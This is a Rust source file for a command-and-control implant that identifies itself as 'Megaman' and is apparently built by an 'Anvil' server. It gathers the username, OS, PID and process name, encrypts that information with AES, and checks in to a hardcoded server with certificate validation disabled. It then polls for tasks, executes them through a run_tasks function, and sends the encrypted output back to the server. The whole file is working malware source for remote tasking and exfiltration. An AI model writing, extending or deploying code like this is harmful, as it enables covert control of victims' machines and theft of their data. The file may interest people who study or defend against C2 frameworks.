use reqwest::blocking::Client;
use reqwest::StatusCode;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::ffi::CString;
use std::thread::sleep;
use std::time::Duration;

use openssl::symm::{Cipher, Crypter, Mode};
use base64::{
    alphabet,
    engine::{self, general_purpose},
    Engine as _,
};

mod func;
//this is the struct that we will use to send our info to the server
#[derive(Serialize, Deserialize, Debug)]
pub struct ImpInfo {
    pub session: String,
    pub ip: String,
    pub username: String,
    //TODO: change hostname for domain (do on server too)
    pub domain: String,
    pub os: String,
    pub imp_pid: String,
    pub process_name: String,
    pub sleep: String,
}

//this is the struct that we will use to send our output to the server
#[derive(Serialize, Deserialize, Debug)]
struct OutputData {
    session: String,
    task_name: String,
    output: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct SleepTime {
    sleep: String,
}

fn main() {
    println!("his name is: {}", "Megaman");

    //this is where we will call functions to collect info for our ImpInfo struct

    //setup our variables.
    let imp_info = ImpInfo {
        session: "adversary".to_string(), //have this pull the actual value later
        //session: env!("UUID").to_string(), //ignore error in vs code, env is set
        ip: func::fake_get_external_ip(), //replace with real func::get_external_ip function
        //change username to show hostname/username
        username: func::get_username(),
        //TODO, change hostname for domain (do on server too). maybe leave blank on mac? i dunno yet
        domain: "todo".to_string(),
        os: func::get_version(),
        imp_pid: func::get_pid(),
        process_name: func::get_process_name(),
        //jitter: env!("JITTER").to_string(), //ignore error in vs code, env is set
        //sleep: env!("SLEEP").to_string(), //ignore error in vs code, env is set
        sleep: String::from("3"),
    };

    //print out our info to make sure it looks good
    println!("Username: {}", imp_info.username);
    println!("Domain: {}", imp_info.domain);
    println!("IP: {}", imp_info.ip);
    println!("OS: {}", imp_info.os);
    println!("PID: {}", imp_info.imp_pid);
    println!("Process Name: {}", imp_info.process_name);

    //print sleep from imp_info for debugging
    println!("Sleep: {}", imp_info.sleep);

    //this is where we will send our info to the server
    send_request(imp_info);
}

//send_request is the main request which sends back Impinfo, IIRC

fn send_request(imp_info: ImpInfo) {
    let header_value = imp_info.session.clone(); // Clone if imp_info.session is owned and needs to be used later

    //starts the loop
    //this loop is to keep trying if we don't reach the server
    //if we reach the server, we enter an inner loop to keep checking for tasks
    //we only return to this loop if we fail to reach the server

    //this is where we will setup our variables for the request
    //jitter is set as an env variable at compile time, by the server performing the build operation
    //let jitter = env!("JITTER").to_string(); //ignore error in vs code, env is set
    let jitter = String::from("3");
    //TODO user agent should be randomized, but for now we will just use a static value
    let user_agent = CString::new("Mozilla/5.0").unwrap();

    /*
    the server name and port needs to be set by the SERVER when generating payloads, so this will be set as an env variable,
    which will trigger on the API call to build an implant using the Anvil server. if you need to compile this yourself,
    you can set the env variable in your terminal, or just hardcode it here
    */
    let server = String::from("192.168.1.19"); //hardcoded for testing
                                               //let port = env!("PORT").to_string(); //ignore error in vs code, env is set
    let port = String::from("443"); //hardcoded for testing

    //this is where we will setup our endpoints
    //TODO endpoints should be randomized, but for now we will just use static values
    //checkin endpoint is where we will send our ImpInfo struct
    let checkin_endpoint = CString::new("/js").unwrap();
    //index endpoint is where we will check for tasks
    let index_endpoint = CString::new("/index").unwrap();
    let return_out_endpoint = CString::new("/return_out").unwrap();

    let mut token = String::new();

    // Use reqwest to send our request with SSL but ignoring cert errors
    let client = Client::builder()
        .user_agent(user_agent.to_str().unwrap())
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    loop {
        if token.is_empty() {
            //this is where we will send our check-in request
            //this is where we will setup our variables for the request

            let mut header_value = imp_info.session.clone(); // Clone if imp_info.session is owned and needs to be used later
                                                             /*
                                                                 let headers = CString::new(format!(
                                                                     "X-Unique-Identifier: {}\r\nContent-Type: application/json",
                                                                     header_value // Clone if imp_info.session is owned and needs to be used later
                                                                 ))
                                                                 .unwrap();
                                                             */

            //add AES encryption here
            let serialized_data =
            serde_json::to_string(&imp_info).expect("Failed to serialize output data");

            // Load the public key from the environment variable
            let encoded_aes_key = env!("AES_KEY");

            //base64 decode the aes key

            let aes_key = decode(encoded_aes_key).expect("Failed to decode AES key");
            //let aes_key_bytes = aes_key.as_bytes();

            // Initialize the AES encryption
            let cipher = Cipher::aes_256_cbc();
            let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
            let mut crypter = Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
                .expect("Failed to create Crypter");

            // Encrypt the data
            let mut encrypted_data = vec![0; serialized_data.len() + cipher.block_size()];
            let mut count = crypter
                .update(serialized_data.as_bytes(), &mut encrypted_data)
                .expect("Failed to encrypt data");
            count += crypter
                .finalize(&mut encrypted_data[count..])
                .expect("Failed to finalize encryption");

            // Truncate to the actual size of the encrypted data
            encrypted_data.truncate(count);

            let iv_clone = iv.clone();
            let encrypted_data_clone = encrypted_data.clone();

            // Print debug information
            //println!("IV: {:?}", iv_clone);
            //println!("Encrypted data length: {}", encrypted_data.len());
            //println!("Encrypted data: {:?}", encrypted_data_clone);

            // Base64 encode the encrypted data
            let base64_encrypted_data = encode(&encrypted_data);

            // Convert the encrypted data to a String
            let request_body = String::from(base64_encrypted_data);

            // This is where we will send our check-in request
            let response = client
                .post(&format!(
                    "https://{}:{}{}",
                    server,
                    port,
                    checkin_endpoint.to_str().unwrap()
                ))
                .header("User-Agent", user_agent.to_str().unwrap())
                .header("X-Unique-Identifier", header_value)
                .header("Content-Type", "text/plain")
                .body(request_body) // Pass the owned String directly
                .send();

            //let mut token = String::new();

            //check the response

            match response {
                Ok(response) => {
                    //if we get a response, we will check the status code
                    match response.status() {
                        StatusCode::OK => {
                            //if we get a 200, we will print the response and break the loop
                            //println!("Response: {}", response.text().unwrap());

                            //the json response will contain a token that we will use to make future requests
                            //store it as imp_token
                            // Assuming `response` is a variable holding the successful HTTP response
                            token = response.text().unwrap();
                            //strip quotes from token
                            token = token.replace("\"", "");
                            println!("Token: {}", token);
                            //break;
                            //sleep and repeat the loop
                            sleep(Duration::from_secs(imp_info.sleep.parse().unwrap()));
                            //repeat the loop
                            //continue;
                        }
                        StatusCode::BAD_REQUEST => {
                            //if we get a 400, we will print the response and break the loop
                            println!("Response: {}", response.text().unwrap());
                            break;
                        }
                        _ => {
                            //if we get any other status code, we will print the response and sleep for the jitter time
                            //println!("Response: {}", response.text().unwrap());
                            //println!("Sleeping for {} seconds", jitter);
                            sleep(Duration::from_secs(imp_info.sleep.parse().unwrap()));
                        }
                    }
                }
                Err(_) => {
                    //if we fail to get a response, we will print the error and sleep for the jitter time
                    //println!("Failed to send request.");
                    //println!("Sleeping for {} seconds", jitter);
                    sleep(Duration::from_secs(imp_info.sleep.parse().unwrap()));
                    continue;
                }
            } //end of match response
        } //end of if token.is_empty()

        //check if token is not empty. if it is not, we'll send the next request

        if !token.is_empty() {
            //this is where we will check for tasks
            //this is where we will setup our variables for the request

            let header_value = token.clone(); // Clone if imp_token is owned and needs to be used later

            let sleep_time = SleepTime {
                sleep: imp_info.sleep.clone(),
            };

            let serialized_data = serde_json::to_string(&sleep_time)
                    .expect("Failed to serialize output data");

            // Load the public key from the environment variable
            let encoded_aes_key = env!("AES_KEY");

            //base64 decode the aes key

            let aes_key =
                decode(encoded_aes_key).expect("Failed to decode AES key");
            //let aes_key_bytes = aes_key.as_bytes();

            // Initialize the AES encryption
            let cipher = Cipher::aes_256_cbc();
            let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
            let mut crypter =
                Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
                    .expect("Failed to create Crypter");

            // Encrypt the data
            let mut encrypted_data =
                vec![0; serialized_data.len() + cipher.block_size()];
            let mut count = crypter
                .update(serialized_data.as_bytes(), &mut encrypted_data)
                .expect("Failed to encrypt data");
            count += crypter
                .finalize(&mut encrypted_data[count..])
                .expect("Failed to finalize encryption");

            // Truncate to the actual size of the encrypted data
            encrypted_data.truncate(count);

            let iv_clone = iv.clone();
            let encrypted_data_clone = encrypted_data.clone();

            // Print debug information
            //println!("IV: {:?}", iv_clone);
            //println!("Encrypted data length: {}", encrypted_data.len());
            //println!("Encrypted data: {:?}", encrypted_data_clone);

            // Base64 encode the encrypted data
            let base64_encrypted_data = encode(&encrypted_data);

            // Convert the encrypted data to a String
            let request_body = String::from(base64_encrypted_data);

            //send request to the index endpoint

            let response = client
                .post(&format!(
                    "https://{}:{}{}",
                    server,
                    port,
                    index_endpoint.to_str().unwrap()
                ))
                .header("User-Agent", user_agent.to_str().unwrap())
                .header("X-Session", header_value.clone())
                .header("Content-Type", "text/plain")
                .body(request_body)
                .send();

            //check the response. if it is good, we'll capture the tasks in the response body and execute them

            let mut tasks = String::new();

            match response {
                Ok(response) => {
                    //if we get a response, we will check the status code
                    match response.status() {
                        StatusCode::OK => {
                            //if we get a 200, we will print the response and break the loop
                            //println!("Response: {}", response.text().unwrap());

                            //the json response will contain a token that we will use to make future requests
                            //store it as imp_token
                            // Assuming `response` is a variable holding the successful HTTP response
                            let tasks = response.text().unwrap();
                            //strip quotes from tasks
                            let tasks = tasks.replace("\"", "");
                            //strip brackets
                            let tasks = tasks.replace("[", "");
                            let tasks = tasks.replace("]", "");
                            //println!("Tasks: {}", tasks);
                            //this is where we will check for tasks
                            let sendtasks = tasks.clone();

                            //strip quotes from tasks
                            //let sendtasks = sendtasks.replace("\"", "");

                            let mut task_name = sendtasks.clone(); //cause im a derp

                            //print tasks for debug
                            println!("Tasks: {}", tasks);
                            //println!("Sendtasks: {}", sendtasks);
                            //println!("Task name: {}", task_name);

                            let mut output = String::new();

                            //let server_name_clone = server.clone(); // i dont remember why i did this

                            if !tasks.trim().is_empty() {
                                let output = func::run_tasks(sendtasks);

                                //print output for debug
                                println!("Output: {}", output);
                            

                            let output_data = OutputData {
                                session: token.clone(),       // Make sure imp_token is a String
                                task_name: task_name.clone(), // Make sure task_name is a String
                                output: output.clone(),       // Make sure output is a String
                            };

                            let serialized_data = serde_json::to_string(&output_data)
                                .expect("Failed to serialize output data");

                            // Load the public key from the environment variable
                            let encoded_aes_key = env!("AES_KEY");

                            //base64 decode the aes key

                            let aes_key =
                                decode(encoded_aes_key).expect("Failed to decode AES key");
                            //let aes_key_bytes = aes_key.as_bytes();

                            // Initialize the AES encryption
                            let cipher = Cipher::aes_256_cbc();
                            let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
                            let mut crypter =
                                Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
                                    .expect("Failed to create Crypter");

                            // Encrypt the data
                            let mut encrypted_data =
                                vec![0; serialized_data.len() + cipher.block_size()];
                            let mut count = crypter
                                .update(serialized_data.as_bytes(), &mut encrypted_data)
                                .expect("Failed to encrypt data");
                            count += crypter
                                .finalize(&mut encrypted_data[count..])
                                .expect("Failed to finalize encryption");

                            // Truncate to the actual size of the encrypted data
                            encrypted_data.truncate(count);

                            let iv_clone = iv.clone();
                            let encrypted_data_clone = encrypted_data.clone();

                            // Print debug information
                            //println!("IV: {:?}", iv_clone);
                            //println!("Encrypted data length: {}", encrypted_data.len());
                            //println!("Encrypted data: {:?}", encrypted_data_clone);

                            // Base64 encode the encrypted data
                            let base64_encrypted_data = encode(&encrypted_data);

                            // Convert the encrypted data to a String
                            let request_body = String::from(base64_encrypted_data);

                            // Send the return_out request
                            let response = client
                                .post(&format!(
                                    "https://{}:{}{}",
                                    server,
                                    port,
                                    return_out_endpoint.to_str().unwrap()
                                ))
                                .header("User-Agent", user_agent.to_str().unwrap())
                                .header("X-Session", header_value.clone())
                                .header("Content-Type", "text/plain") // Update Content-Type to text/plain
                                // send the string data
                                .body(request_body) // Assuming request_body is the string you want to send
                                .send();

                            //check if the response is good. if it is, print "we made it" and continue the loop
                            //if response is bad, print "we failed" and continue the loop

                            match response {
                                Ok(response) => {
                                    //if we get a response, we will check the status code
                                    match response.status() {
                                        StatusCode::OK => {
                                            //if we get a 200, we will print the response and break the loop
                                            println!("We made it");
                                            //break;
                                            //sleep and repeat the loop
                                            sleep(Duration::from_secs(
                                                imp_info.sleep.parse().unwrap(),
                                            ));
                                            //repeat the loop
                                            continue;
                                        }
                                        StatusCode::BAD_REQUEST => {
                                            //if we get a 400, we will print the response and break the loop
                                            println!("We failed");
                                            continue;
                                        }
                                        _ => {
                                            //if we get any other status code, we will print the response and sleep for the jitter time
                                            //println!("Response: {}", response.text().unwrap());
                                            //println!("Sleeping for {} seconds", jitter);
                                            sleep(Duration::from_secs(
                                                imp_info.sleep.parse().unwrap(),
                                            ));
                                            continue;
                                        }
                                    }
                                }
                                Err(_) => {
                                    //if we fail to get a response, we will print the error and sleep for the jitter time
                                    //println!("Failed to send request.");
                                    //println!("Sleeping for {} seconds", jitter);
                                    sleep(Duration::from_secs(imp_info.sleep.parse().unwrap()));
                                    continue;
                                }
                            } //end of match response

                        } //end of if !tasks.trim().is_empty()

                        //else if tasks is empty, we will sleep for the sleep time and continue the loop
                        else {
                            println!("Tasks is empty");

                            //sleep and repeat the loop

                            sleep(Duration::from_secs(imp_info.sleep.parse().unwrap()));

                            //repeat the loop
                            continue;
                        }
                              //break;
                              //sleep and repeat the loop
                            sleep(Duration::from_secs(imp_info.sleep.parse().unwrap()));
                            //repeat the loop
                            continue;
                        }
                        StatusCode::BAD_REQUEST => {
                            //if we get a 400, we will print the response and break the loop
                            //println!("Response: {}", response.text().unwrap());
                            break;
                        }
                        _ => {
                            //if we get any other status code, we will print the response and sleep for the jitter time
                            //println!("Response: {}", response.text().unwrap());
                            //println!("Sleeping for {} seconds", jitter);
                            sleep(Duration::from_secs(imp_info.sleep.parse().unwrap()));
                            continue;
                        }
                    }
                }
                Err(_) => {
                    //if we fail to get a response, we will print the error and sleep for the jitter time
                    //println!("Failed to send request.");
                    //println!("Sleeping for {} seconds", jitter);
                    sleep(Duration::from_secs(imp_info.sleep.parse().unwrap()));
                    continue;
                }
            } //end of match response
        } //end of if !token.is_empty()
          //break;
    } //end of loop
}

pub fn encode(data: &[u8]) -> String {
    // Define a custom encoding engine using the URL-safe alphabet and no padding.
    const CUSTOM_ENGINE: engine::GeneralPurpose =
    engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);

    // Encode the data using the custom encoding engine.
    let content = CUSTOM_ENGINE.encode(data);

    // Return the encoded content.
    content

}

pub fn decode(data: &str) -> Result<Vec<u8>, String> {
// Define a custom encoding engine using the URL-safe alphabet and no padding.
const CUSTOM_ENGINE: engine::GeneralPurpose =
    engine::GeneralPurpose::new(&alphabet::URL_SAFE, engine::general_purpose::NO_PAD);

// Decode the data using the custom encoding engine.
let content_res = CUSTOM_ENGINE.decode(data);

// Handle the result and return the decoded content or an error.
match content_res {
    Ok(content) => Ok(content),
    Err(e) => Err(format!("Error decoding data: {}", e)),
}
}